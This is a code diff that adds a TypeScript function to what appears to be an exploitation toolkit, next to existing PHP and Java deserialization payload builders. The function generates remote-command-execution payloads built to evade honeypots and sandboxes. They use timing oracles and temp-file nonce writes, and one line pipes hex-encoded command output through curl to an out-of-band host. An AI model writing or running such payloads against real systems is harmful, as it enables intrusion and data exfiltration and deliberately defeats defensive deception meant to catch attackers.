@@ -3652,3 +3652,20 @@ export function buildPhpDeserPayloads(cmd: string): string[] {
     `rO0ABXNy`,
   ];
 }
+
+/** Honeypot-aware payloads: use timing differences and OOB to confirm real execution
+    vs sandboxed/honeypot environments. */
+export function buildHoneypotAwarePayloads(cmd: string, oobBase: string, tok: string): string[] {
+  // Use random sleep to detect fixed-response honeypots
+  const sleep = Math.floor(Math.random() * 3) + 2; // 2-4s
+  return [
+    // Time the actual command — honeypots often return instantly regardless
+    `T1=$(date +%s%3N); ${cmd}; T2=$(date +%s%3N); echo "exec_ms=$((T2-T1))"`,
+    // Write unique nonce to temp file — honeypots rarely have real FS writes
+    `NONCE=$(cat /dev/urandom | head -c 8 | xxd -p 2>/dev/null); ${cmd}; echo $NONCE > /tmp/.$NONCE; cat /tmp/.$NONCE; rm /tmp/.$NONCE 2>/dev/null`,
+    // DNS-based confirmation — real RCE will actually fire the DNS query
+    `${cmd} 2>&1 | head -1 | xxd -p | xargs -I{} curl -sk "${oobBase}?t=${tok}&hp=1&d={}" 2>/dev/null`,
+    // Random sleep + command — timing oracle that bypasses fixed honeypot responses
+    `sleep ${sleep} && ${cmd}`,
+  ];
+}
